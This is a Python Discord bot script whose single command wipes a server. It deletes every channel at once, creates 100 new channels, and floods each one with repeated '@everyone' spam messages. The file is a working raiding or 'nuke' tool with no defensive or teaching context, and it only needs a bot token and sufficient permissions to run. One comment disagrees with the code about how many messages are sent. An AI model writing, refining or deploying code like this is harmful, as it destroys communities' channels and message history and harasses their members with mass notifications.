import discord
from discord.ext import commands
import asyncio

# Replace with your bot's token
TOKEN = 'add your bot token'

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='s', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

# Command to delete all channels, create multiple new ones, and send messages fast
@bot.command()
async def kibidi(ctx):
    guild = ctx.guild  # Use the server where the command was issued

    if guild is None:
        await ctx.send("Could not identify the server.")
        return

    # Delete the user's command message
    await ctx.message.delete()

    # Delete all channels concurrently
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks)
    print("Deleted all channels")

    # Create multiple new channels concurrently
    num_channels = 100  # Adjust this number to create more or fewer channels
    create_tasks = [guild.create_text_channel(f"why so serious") for i in range(num_channels)]
    new_channels = await asyncio.gather(*create_tasks)
    print(f"Created {num_channels} new channels")

    # Send messages quickly in all new channels concurrently
    async def send_message(channel, i):
        await channel.send(f"@everyone OHIO RIZZ GYAT 🤑🤑🤑🤑🤑🤑🤑")
        print(f"Sent message {i + 1} in {channel.name}")

    # Send 5 messages in each newly created channel concurrently
    message_tasks = []
    for channel in new_channels:
        message_tasks.extend([send_message(channel, i) for i in range(10)])  # Adjust the range for more/fewer messages

    await asyncio.gather(*message_tasks)
    print("Finished sending messages")

bot.run(TOKEN)
